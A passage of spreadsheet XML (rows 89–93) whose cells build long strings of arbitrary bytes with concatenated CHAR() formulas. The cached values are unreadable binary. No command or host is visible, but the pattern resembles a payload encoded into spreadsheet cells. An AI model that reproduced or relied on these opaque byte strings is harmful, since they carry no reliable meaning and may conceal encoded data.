9)&amp;CHAR(219)&amp;CHAR(200)&amp;CHAR(223)&amp;CHAR(59)&amp;CHAR(32)&amp;CHAR(201)&amp;CHAR(192)&amp;CHAR(27)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(251)&amp;CHAR(193)&amp;CHAR(234)&amp;CHAR(176)&amp;CHAR(39)&amp;CHAR(49)&amp;CHAR(221)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(161)&amp;CHAR(157)</f>
        <v>H%Ð¬ñ_x0004_:_x0011_KØ'_x0012_
§ä¨­‰Gàã¹s™Ú:‰s‹ÈšÖ‚*©ÍdÊ£ƒ_x0001_¢)_x0014_I_x000E__x001C_èª¾_x0010_¨,q=Ì9¶¹xZÏ_x0003_¼™Åƒø¨µ_x001D_â¤–þrê–_x0002_§_x0014_ù444b®b«E_x001A_&amp;âE_x0002_ü«³È _x0001_Î&lt;±¼7ÙNþáñÁ@
OÅ]Ýœ‰0-Ü_x001B_o	»IUÆz]sJ+Sþžÿ\_x000D_Ê_x000C__x0011_-_x0012_ˆ#_x0002_1€ñ_x0005_Û;
2½­„_x000F_fZê›¤/ÛÙmj·åSL\“±ÈÌxÒˆ¥¬‚`‹_x0019_õûBÐ×_x0013_¦Þ_x0016__x001B_ÔýÃV“@05B_x0015_ÁI‘ëi_x0008_ Ó_x0007_5ƒÎî‹—tÚ”_x001D_ø	ÛÈß; ÉÀ_x001B__x0006_ˆûÁê°'1ÝùU¡</v>
      </c>
      <c r="C89" t="str">
        <f>CHAR(55)&amp;CHAR(212)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(21)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>7ÔžC_x0015_€ÓÏ&gt;±</v>
      </c>
    </row>
    <row r="90" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B90" t="str">
        <f>CHAR(145)&amp;CHAR(115)&amp;CHAR(70)&amp;CHAR(41)&amp;CHAR(79)&amp;CHAR(115)&amp;CHAR(170)&amp;CHAR(96)&amp;CHAR(249)&amp;CHAR(76)&amp;CHAR(81)&amp;CHAR(232)&amp;CHAR(138)&amp;CHAR(77)&amp;CHAR(216)&amp;CHAR(144)&amp;CHAR(5)&amp;CHAR(255)&amp;CHAR(77)&amp;CHAR(136)&amp;CHAR(207)&amp;CHAR(215)&amp;CHAR(112)&amp;CHAR(63)&amp;CHAR(6)&amp;CHAR(240)&amp;CHAR(54)&amp;CHAR(36)&amp;CHAR(68)&amp;CHAR(101)&amp;CHAR(119)&amp;CHAR(148)&amp;CHAR(181)&amp;CHAR(252)&amp;CHAR(107)&amp;CHAR(135)&amp;CHAR(190)&amp;CHAR(99)&amp;CHAR(254)&amp;CHAR(70)&amp;CHAR(7)&amp;CHAR(181)&amp;CHAR(63)&amp;CHAR(81)&amp;CHAR(85)&amp;CHAR(91)&amp;CHAR(164)&amp;CHAR(54)&amp;CHAR(166)&amp;CHAR(158)&amp;CHAR(83)&amp;CHAR(8)&amp;CHAR(137)&amp;CHAR(243)&amp;CHAR(99)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(108)&amp;CHAR(253)&amp;CHAR(58)&amp;CHAR(137)&amp;CHAR(135)&amp;CHAR(67)&amp;CHAR(240)&amp;CHAR(34)&amp;CHAR(247)&amp;CHAR(138)&amp;CHAR(75)&amp;CHAR(78)&amp;CHAR(127)&amp;CHAR(43)&amp;CHAR(108)&amp;CHAR(147)&amp;CHAR(106)&amp;CHAR(185)&amp;CHAR(253)&amp;CHAR(238)&amp;CHAR(88)&amp;CHAR(207)&amp;CHAR(227)&amp;CHAR(77)&amp;CHAR(193)&amp;CHAR(157)&amp;CHAR(115)&amp;CHAR(18)&amp;CHAR(195)&amp;CHAR(26)&amp;CHAR(254)&amp;CHAR(62)&amp;CHAR(58)&amp;CHAR(66)&amp;CHAR(17)&amp;CHAR(251)&amp;CHAR(199)&amp;CHAR(49)&amp;CHAR(243)&amp;CHAR(78)&amp;CHAR(184)&amp;CHAR(112)&amp;CHAR(43)&amp;CHAR(213)&amp;CHAR(135)&amp;CHAR(25)&amp;CHAR(166)&amp;CHAR(71)&amp;CHAR(152)&amp;CHAR(168)&amp;CHAR(169)&amp;CHAR(212)&amp;CHAR(3)&amp;CHAR(44)&amp;CHAR(20)&amp;CHAR(172)&amp;CHAR(238)&amp;CHAR(167)&amp;CHAR(191)&amp;CHAR(115)&amp;CHAR(11)&amp;CHAR(100)&amp;CHAR(119)&amp;CHAR(246)&amp;CHAR(47)&amp;CHAR(87)&amp;CHAR(228)&amp;CHAR(5)&amp;CHAR(165)&amp;CHAR(73)&amp;CHAR(81)&amp;CHAR(18)&amp;CHAR(77)&amp;CHAR(71)&amp;CHAR(97)&amp;CHAR(116)&amp;CHAR(129)&amp;CHAR(120)&amp;CHAR(159)&amp;CHAR(175)&amp;CHAR(52)&amp;CHAR(193)&amp;CHAR(3)&amp;CHAR(168)&amp;CHAR(187)&amp;CHAR(214)&amp;CHAR(63)&amp;CHAR(163)&amp;CHAR(88)&amp;CHAR(18)&amp;CHAR(172)&amp;CHAR(155)&amp;CHAR(199)&amp;CHAR(67)&amp;CHAR(251)&amp;CHAR(138)&amp;CHAR(114)&amp;CHAR(232)&amp;CHAR(145)&amp;CHAR(22)&amp;CHAR(85)&amp;CHAR(21)&amp;CHAR(183)&amp;CHAR(43)&amp;CHAR(249)&amp;CHAR(70)&amp;CHAR(44)&amp;CHAR(186)&amp;CHAR(51)&amp;CHAR(125)&amp;CHAR(140)&amp;CHAR(29)&amp;CHAR(112)&amp;CHAR(59)&amp;CHAR(252)&amp;CHAR(171)&amp;CHAR(16)&amp;CHAR(217)&amp;CHAR(195)&amp;CHAR(224)&amp;CHAR(112)&amp;CHAR(181)&amp;CHAR(22)&amp;CHAR(231)&amp;CHAR(13)&amp;CHAR(174)&amp;CHAR(72)&amp;CHAR(88)&amp;CHAR(94)&amp;CHAR(190)&amp;CHAR(209)&amp;CHAR(203)&amp;CHAR(128)&amp;CHAR(251)&amp;CHAR(201)&amp;CHAR(21)&amp;CHAR(41)&amp;CHAR(191)&amp;CHAR(198)&amp;CHAR(205)&amp;CHAR(5)&amp;CHAR(175)&amp;CHAR(226)&amp;CHAR(183)&amp;CHAR(4)&amp;CHAR(45)&amp;CHAR(198)&amp;CHAR(198)&amp;CHAR(243)&amp;CHAR(193)&amp;CHAR(144)&amp;CHAR(72)&amp;CHAR(190)&amp;CHAR(203)&amp;CHAR(68)&amp;CHAR(215)&amp;CHAR(29)&amp;CHAR(182)&amp;CHAR(247)&amp;CHAR(127)&amp;CHAR(9)&amp;CHAR(31)&amp;CHAR(246)&amp;CHAR(112)&amp;CHAR(39)&amp;CHAR(48)&amp;CHAR(17)&amp;CHAR(127)&amp;CHAR(14)&amp;CHAR(76)&amp;CHAR(230)&amp;CHAR(34)&amp;CHAR(9)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(90)&amp;CHAR(202)&amp;CHAR(207)&amp;CHAR(9)&amp;CHAR(115)&amp;CHAR(24)&amp;CHAR(65)&amp;CHAR(219)&amp;CHAR(249)&amp;CHAR(154)&amp;CHAR(68)&amp;CHAR(171)&amp;CHAR(243)&amp;CHAR(23)&amp;CHAR(160)&amp;CHAR(137)&amp;CHAR(104)&amp;CHAR(42)&amp;CHAR(90)&amp;CHAR(52)&amp;CHAR(190)&amp;CHAR(142)&amp;CHAR(173)</f>
        <v>‘sF)Osª`ùLQèŠMØ_x0005_ÿMˆÏ×p?_x0006_ð6$Dew”µük‡¾cþF_x0007_µ?QU[¤6¦žS_x0008_‰ócÿálý:‰‡Cð"÷ŠKN+l“j¹ýîXÏãMÁs_x0012_Ã_x001A_þ&gt;:B_x0011_ûÇ1óN¸p+Õ‡_x0019_¦G˜¨©Ô_x0003_,_x0014_¬î§¿s_x000B_dwö/Wä_x0005_¥IQ_x0012_MGatxŸ¯4Á_x0003_¨»Ö?£X_x0012_¬›ÇCûŠrè‘_x0016_U_x0015_·+ùF,º3}Œ_x001D_p;ü«_x0010_ÙÃàpµ_x0016_ç_x000D_®HX^¾ÑË€ûÉ_x0015_)¿ÆÍ_x0005_¯â·_x0004_-ÆÆóÁH¾ËD×_x001D_¶÷	_x001F_öp'0_x0011__x000E_Læ"	ÉŽZÊÏ	s_x0018_AÛùšD«ó_x0017_ ‰h*Z4¾Ž­</v>
      </c>
      <c r="C90" t="str">
        <f>CHAR(41)&amp;CHAR(158)&amp;CHAR(25)&amp;CHAR(32)&amp;CHAR(59)&amp;CHAR(192)&amp;CHAR(187)&amp;CHAR(13)&amp;CHAR(215)&amp;CHAR(200)</f>
        <v>)ž_x0019_ ;À»_x000D_×È</v>
      </c>
    </row>
    <row r="91" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B91" t="str">
        <f>CHAR(12)&amp;CHAR(94)&amp;CHAR(50)&amp;CHAR(103)&amp;CHAR(157)&amp;CHAR(63)&amp;CHAR(118)&amp;CHAR(17)&amp;CHAR(211)&amp;CHAR(207)&amp;CHAR(236)&amp;CHAR(42)&amp;CHAR(114)&amp;CHAR(85)&amp;CHAR(44)&amp;CHAR(99)&amp;CHAR(56)&amp;CHAR(167)&amp;CHAR(90)&amp;CHAR(63)&amp;CHAR(139)&amp;CHAR(180)&amp;CHAR(88)&amp;CHAR(175)&amp;CHAR(139)&amp;CHAR(115)&amp;CHAR(165)&amp;CHAR(219)&amp;CHAR(85)&amp;CHAR(164)&amp;CHAR(215)&amp;CHAR(199)&amp;CHAR(46)&amp;CHAR(147)&amp;CHAR(32)&amp;CHAR(131)&amp;CHAR(138)&amp;CHAR(132)&amp;CHAR(190)&amp;CHAR(160)&amp;CHAR(131)&amp;CHAR(163)&amp;CHAR(87)&amp;CHAR(14)&amp;CHAR(251)&amp;CHAR(35)&amp;CHAR(32)&amp;CHAR(18)&amp;CHAR(42)&amp;CHAR(53)&amp;CHAR(101)&amp;CHAR(60)&amp;CHAR(57)&amp;CHAR(59)&amp;CHAR(216)&amp;CHAR(193)&amp;CHAR(221)&amp;CHAR(120)&amp;CHAR(162)&amp;CHAR(98)&amp;CHAR(91)&amp;CHAR(228)&amp;CHAR(170)&amp;CHAR(91)&amp;CHAR(109)&amp;CHAR(151)&amp;CHAR(235)&amp;CHAR(252)&amp;CHAR(17)&amp;CHAR(129)&amp;CHAR(253)&amp;CHAR(151)&amp;CHAR(84)&amp;CHAR(43)&amp;CHAR(244)&amp;CHAR(37)&amp;CHAR(101)&amp;CHAR(199)&amp;CHAR(218)&amp;CHAR(178)&amp;CHAR(146)&amp;CHAR(176)&amp;CHAR(99)&amp;CHAR(241)&amp;CHAR(8)&amp;CHAR(128)&amp;CHAR(246)&amp;CHAR(66)&amp;CHAR(32)&amp;CHAR(153)&amp;CHAR(9)&amp;CHAR(171)&amp;CHAR(157)&amp;CHAR(54)&amp;CHAR(80)&amp;CHAR(88)&amp;CHAR(84)&amp;CHAR(80)&amp;CHAR(134)&amp;CHAR(233)&amp;CHAR(41)&amp;CHAR(81)&amp;CHAR(86)&amp;CHAR(95)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(119)&amp;CHAR(38)&amp;CHAR(48)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(43)&amp;CHAR(248)&amp;CHAR(117)&amp;CHAR(38)&amp;CHAR(249)&amp;CHAR(116)&amp;CHAR(70)&amp;CHAR(254)&amp;CHAR(118)&amp;CHAR(79)&amp;CHAR(85)&amp;CHAR(235)&amp;CHAR(212)&amp;CHAR(23)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(248)&amp;CHAR(117)&amp;CHAR(46)&amp;CHAR(142)&amp;CHAR(253)&amp;CHAR(249)&amp;CHAR(126)&amp;CHAR(42)&amp;CHAR(249)&amp;CHAR(127)&amp;CHAR(88)&amp;CHAR(250)&amp;CHAR(124)&amp;CHAR(85)&amp;CHAR(81)&amp;CHAR(233)&amp;CHAR(174)&amp;CHAR(24)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(35)&amp;CHAR(134)&amp;CHAR(221)&amp;CHAR(136)&amp;CHAR(90)&amp;CHAR(38)&amp;CHAR(55)&amp;CHAR(130)&amp;CHAR(252)&amp;CHAR(9)&amp;CHAR(133)&amp;CHAR(20)&amp;CHAR(11)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(148)&amp;CHAR(217)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(111)&amp;CHAR(6)&amp;CHAR(109)&amp;CHAR(5)&amp;CHAR(57)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(246)&amp;CHAR(50)&amp;CHAR(110)&amp;CHAR(11)&amp;CHAR(253)&amp;CHAR(210)&amp;CHAR(128)&amp;CHAR(246)&amp;CHAR(130)&amp;CHAR(241)&amp;CHAR(13)&amp;CHAR(138)&amp;CHAR(240)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(254)&amp;CHAR(48)&amp;CHAR(85)&amp;CHAR(85)&amp;CHAR(237)&amp;CHAR(26)&amp;CHAR(27)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(104)&amp;CHAR(34)&amp;CHAR(136)&amp;CHAR(73)&amp;CHAR(34)&amp;CHAR(41)&amp;CHAR(104)&amp;CHAR(6)&amp;CHAR(88)&amp;CHAR(228)&amp;CHAR(40)&amp;CHAR(22)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(21)&amp;CHAR(143)&amp;CHAR(167)&amp;CHAR(53)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(32)&amp;CHAR(53)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(83)&amp;CHAR(82)&amp;CHAR(135)&amp;CHAR(64)&amp;CHAR(21)&amp;CHAR(81)&amp;CHAR(132)&amp;CHAR(65)&amp;CHAR(1)&amp;CHAR(65)&amp;CHAR(234)&amp;CHAR(238)&amp;CHAR(18)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(246)&amp;CHAR(116)&amp;CHAR(41)&amp;CHAR(143)&amp;CHAR(131)&amp;CHAR(29)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(3)</f>
        <v>_x000C_^2g?v_x0011_ÓÏì*rU,c8§Z?‹´X¯‹s¥ÛU¤×Ç.“ ƒŠ„¾ ƒ£W_x000E_û# _x0012_*5e&lt;9;ØÁÝx¢b[äª[m—ëü_x0011_ý—T+ô%eÇÚ²’°cñ_x0008_€öB ™	«6PXTP†é)QV_Rw&amp;0ôq+øu&amp;ùtFþvOUëÔ_x0017__x0006__x0005_øu.Žýù~*ùXú|UQé®_x0018_	_x0005_€É#†ÝˆZ&amp;7‚ü	…_x0014__x000B__x0007__x0005_”Ù_x000D__x0007__x0004_	_x0002_o_x0006_m_x0005_9_x0002__x0003_ö2n_x000B_ýÒ€ö‚ñ_x000D_Šð_x0002_
_x0001_þ0UUí_x001A__x001B__x0005__x0007_h"ˆI")h_x0006_Xä(_x0016__x0005__x0006_Š_x0015_§5_x0001__x000D__x000B_ 5_x0003__x0006__x0002_SR‡@_x0015_Q„A_x0001_Aêî_x0012_
_x0006_öt)ƒ_x001D__x000F__x0002__x0003_</v>
      </c>
      <c r="C91" t="str">
        <f>CHAR(33)&amp;CHAR(192)&amp;CHAR(179)&amp;CHAR(68)&amp;CHAR(58)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!À³D:”þÈ!¥</v>
      </c>
    </row>
    <row r="92" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B92" t="str">
        <f>CHAR(246)&amp;CHAR(115)&amp;CHAR(44)&amp;CHAR(91)&amp;CHAR(234)&amp;CHAR(177)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(132)&amp;CHAR(198)&amp;CHAR(58)&amp;CHAR(61)&amp;CHAR(133)&amp;CHAR(18)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(74)&amp;CHAR(12)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(60)&amp;CHAR(148)&amp;CHAR(30)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(135)&amp;CHAR(69)&amp;CHAR(9)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(244)&amp;CHAR(115)&amp;CHAR(42)&amp;CHAR(254)&amp;CHAR(101)&amp;CHAR(42)&amp;CHAR(246)&amp;CHAR(115)&amp;CHAR(55)&amp;CHAR(242)&amp;CHAR(125)&amp;CHAR(61)&amp;CHAR(83)&amp;CHAR(233)&amp;CHAR(29)&amp;CHAR(24)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(137)&amp;CHAR(194)&amp;CHAR(21)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(55)&amp;CHAR(128)&amp;CHAR(209)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(127)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(49)&amp;CHAR(250)&amp;CHAR(59)&amp;CHAR(187)&amp;CHAR(49)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(127)&amp;CHAR(19)&amp;CHAR(137)&amp;CHAR(149)&amp;CHAR(58)&amp;CHAR(6)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(84)&amp;CHAR(248)&amp;CHAR(84)&amp;CHAR(62)&amp;CHAR(65)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(33)&amp;CHAR(58)&amp;CHAR(185)&amp;CHAR(54)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(116)&amp;CHAR(245)&amp;CHAR(52)&amp;CHAR(217)&amp;CHAR(65)&amp;CHAR(60)&amp;CHAR(80)&amp;CHAR(6)&amp;CHAR(127)&amp;CHAR(54)&amp;CHAR(139)&amp;CHAR(102)&amp;CHAR(56)&amp;CHAR(136)&amp;CHAR(117)&amp;CHAR(61)&amp;CHAR(249)&amp;CHAR(119)&amp;CHAR(63)&amp;CHAR(253)&amp;CHAR(127)&amp;CHAR(45)&amp;CHAR(252)&amp;CHAR(122)&amp;CHAR(15)&amp;CHAR(242)&amp;CHAR(50)&amp;CHAR(87)&amp;CHAR(238)&amp;CHAR(204)&amp;CHAR(26)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(133)&amp;CHAR(197)&amp;CHAR(21)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(5)&amp;CHAR(148)&amp;CHAR(194)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(216)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(70)&amp;CHAR(129)&amp;CHAR(194)&amp;CHAR(13)&amp;CHAR(138)&amp;CHAR(199)&amp;CHAR(7)&amp;CHAR(50)&amp;CHAR(155)&amp;CHAR(52)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(121)&amp;CHAR(212)&amp;CHAR(140)&amp;CHAR(129)&amp;CHAR(14)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(96)&amp;CHAR(3)&amp;CHAR(90)&amp;CHAR(60)&amp;CHAR(193)&amp;CHAR(118)&amp;CHAR(16)&amp;CHAR(91)&amp;CHAR(238)&amp;CHAR(44)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(92)&amp;CHAR(136)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(134)&amp;CHAR(161)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(131)&amp;CHAR(10)&amp;CHAR(4)&amp;CHAR(19)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(187)&amp;CHAR(75)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(249)&amp;CHAR(7)&amp;CHAR(118)&amp;CHAR(1)&amp;CHAR(140)&amp;CHAR(53)&amp;CHAR(133)&amp;CHAR(191)&amp;CHAR(65)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(16)&amp;CHAR(118)&amp;CHAR(36)&amp;CHAR(95)&amp;CHAR(226)&amp;CHAR(52)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(91)&amp;CHAR(128)&amp;CHAR(197)&amp;CHAR(124)&amp;CHAR(10)&amp;CHAR(58)&amp;CHAR(151)&amp;CHAR(69)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(112)&amp;CHAR(115)&amp;CHAR(80)&amp;CHAR(239)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(90)&amp;CHAR(143)&amp;CHAR(193)&amp;CHAR(116)&amp;CHAR(15)&amp;CHAR(59)&amp;CHAR(157)&amp;CHAR(69)&amp;CHAR(14)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(115)&amp;CHAR(103)&amp;CHAR(129)</f>
        <v>ös,[ê±_x0011__x0006__x0007_„Æ:=…_x0012__x0006__x0001__x0007__x000D_†J_x000C__x0006__x0005_&lt;”_x001E__x0002__x000D__x0006__x0006_‡E	_x000C__x0005_ôs*þe*ös7ò}=Sé_x001D__x0018__x0003__x0007_‰Â_x0015_ˆO7€Ñ_x000D_†_x000B__x0006_	1ú;»1_x000B__x0002__x0003__x0013_‰•:_x0006__x000B__x0006_TøT&gt;A€É!:¹6_x0001__x0005__x000D_tõ4ÙA&lt;P_x0006_6‹f8ˆu=ùw?ý-üz_x000F_ò2WîÌ_x001A__x0007_
…Å_x0015_€B_x0005_”Â_x000D_Ø_x0006_	_x0002_FÂ_x000D_ŠÇ_x0007_2›4	_x0002__x0004_yÔŒ_x000E__x000B__x0006__x0003_`_x0003_Z&lt;Áv_x0010_[î,_x0002__x0002__x0002_\ˆÆ_x0006_†¡_x0008__x000C__x0005_€ƒ
_x0004__x0013__x0002_„»K
_x000B__x000D_†ù_x0007_v_x0001_Œ5…¿A
_x0007__x0005__x0010_v$_â4
_x0002__x0005_[€Å|
:—E_x0007__x000B__x0002_psPï_x0002__x0006__x000E__x0006_ZÁt_x000F_;E_x000E__x0006__x0005_sg</v>
      </c>
      <c r="C92" t="str">
        <f>CHAR(179)&amp;CHAR(70)&amp;CHAR(249)&amp;CHAR(249)&amp;CHAR(87)&amp;CHAR(15)&amp;CHAR(161)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>³FùùW_x000F_¡¥ûÏ</v>
      </c>
    </row>
    <row r="93" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B93" t="str">
        <f>CHAR(58)&amp;CHAR(14)&amp;CHAR(114)&amp;CHAR(80)&amp;CHAR(129)&amp;CHAR(57)&amp;CHAR(12)&amp;CHAR(120)&amp;CHAR(81)&amp;CHAR(136)&amp;CHAR(58)&amp;CHAR(7)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(59)&amp;CHAR(22)&amp;CHAR(113)&amp;CHAR(28)&amp;CHAR(142)&amp;CHAR(52)&amp;CHAR(8)&amp;CHAR(113)&amp;CHAR(19)&amp;CHAR(133)&amp;CHAR(61)&amp;CHAR(5)&amp;CHAR(115)&amp;CHAR(7)&amp;CHAR(133)&amp;CHAR(62)&amp;CHAR(6)&amp;CHAR(124)&amp;CHAR(68)&amp;CHAR(83)&amp;CHAR(249)&amp;CHAR(231)&amp;CHAR(21)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(237)&amp;CHAR(51)&amp;CHAR(84)&amp;CHAR(237)&amp;CHAR(78)&amp;CHAR(19)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(233)&amp;CHAR(49)&amp;CHAR(132)&amp;CHAR(65)&amp;CHAR(32)&amp;CHAR(27)&amp;CHAR(82)&amp;CHAR(82)&amp;CHAR(227)&amp;CHAR(225)&amp;CHAR(11)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(87)&amp;CHAR(95)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(117)&amp;CHAR(12)&amp;CHAR(138)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(21)&amp;CHAR(93)&amp;CHAR(80)&amp;CHAR(237)&amp;CHAR(230)&amp;CHAR(12)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(84)&amp;CHAR(95)&amp;CHAR(132)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(24)&amp;CHAR(92)&amp;CHAR(83)&amp;CHAR(227)&amp;CHAR(88)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(19)&amp;CHAR(91)&amp;CHAR(226)&amp;CHAR(3)&amp;CHAR(85)&amp;CHAR(229)&amp;CHAR(154)&amp;CHAR(28)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(95)&amp;CHAR(137)&amp;CHAR(95)&amp;CHAR(35)&amp;CHAR(62)&amp;CHAR(133)&amp;CHAR(191)&amp;CHAR(13)&amp;CHAR(12)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(19)&amp;CHAR(189)&amp;CHAR(2)&amp;CHAR(201)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(124)&amp;CHAR(44)&amp;CHAR(142)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(134)&amp;CHAR(201)&amp;CHAR(113)&amp;CHAR(32)&amp;CHAR(244)&amp;CHAR(180)&amp;CHAR(68)&amp;CHAR(12)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(109)&amp;CHAR(2)&amp;CHAR(94)&amp;CHAR(238)&amp;CHAR(120)&amp;CHAR(17)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(132)&amp;CHAR(198)&amp;CHAR(15)&amp;CHAR(82)&amp;CHAR(103)&amp;CHAR(6)&amp;CHAR(250)&amp;CHAR(177)&amp;CHAR(74)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(249)&amp;CHAR(95)&amp;CHAR(66)&amp;CHAR(133)&amp;CHAR(174)&amp;CHAR(68)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(254)&amp;CHAR(37)&amp;CHAR(104)&amp;CHAR(9)&amp;CHAR(83)&amp;CHAR(235)&amp;CHAR(86)&amp;CHAR(16)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(130)&amp;CHAR(194)&amp;CHAR(14)&amp;CHAR(84)&amp;CHAR(109)&amp;CHAR(10)&amp;CHAR(80)&amp;CHAR(254)&amp;CHAR(210)&amp;CHAR(58)&amp;CHAR(199)&amp;CHAR(238)&amp;CHAR(18)&amp;CHAR(129)&amp;CHAR(202)&amp;CHAR(246)&amp;CHAR(85)&amp;CHAR(88)&amp;CHAR(84)&amp;CHAR(89)&amp;CHAR(134)&amp;CHAR(198)&amp;CHAR(37)&amp;CHAR(198)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(196)&amp;CHAR(15)&amp;CHAR(242)&amp;CHAR(251)&amp;CHAR(11)&amp;CHAR(141)&amp;CHAR(7)&amp;CHAR(197)&amp;CHAR(6)&amp;CHAR(14)&amp;CHAR(53)&amp;CHAR(195)&amp;CHAR(200)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(137)&amp;CHAR(239)&amp;CHAR(243)&amp;CHAR(72)&amp;CHAR(22)&amp;CHAR(7)&amp;CHAR(81)&amp;CHAR(137)&amp;CHAR(119)&amp;CHAR(13)&amp;CHAR(90)&amp;CHAR(114)&amp;CHAR(28)&amp;CHAR(137)&amp;CHAR(123)&amp;CHAR(16)&amp;CHAR(137)&amp;CHAR(250)&amp;CHAR(127)&amp;CHAR(30)&amp;CHAR(141)&amp;CHAR(71)&amp;CHAR(7)&amp;CHAR(82)&amp;CHAR(130)&amp;CHAR(13)&amp;CHAR(252)&amp;CHAR(92)&amp;CHAR(15)&amp;CHAR(134)&amp;CHAR(67)&amp;CHAR(21)&amp;CHAR(143)&amp;CHAR(5)&amp;CHAR(245)&amp;CHAR(66)</f>
        <v>:_x000E_rP9_x000C_xQˆ:_x0007_u0;_x0016_q_x001C_Ž4_x0008_q_x0013_…=_x0005_s_x0007_…&gt;_x0006_|DSùç_x0015_	
í3TíN_x0013__x0005_	é1„A _x001B_RRãá_x000B__x0007__x0002_W_†Êu_x000C_ŠF'_x0015_]Píæ_x000C__x0002__x0005_T_„F"_x0018_\SãX_x000E__x0001__x0013_[â_x0003_Uåš_x001C__x0005__x0001__‰_#&gt;…¿_x000D__x000C__x0007__x0005__x0013_½_x0002_É
_x0006_|,Ž„M_x0002_	_x0002_†Éq ô´D_x000C__x0006__x0007_m_x0002_^îx_x0011__x0001__x0001_„Æ_x000F_Rg_x0006_ú±J_x0005__x0005__x000D_ù_B…®D_x0002__x000B__x0005__x0006_þ%h	SëV_x0010__x000D__x0005_‚Â_x000E_Tm
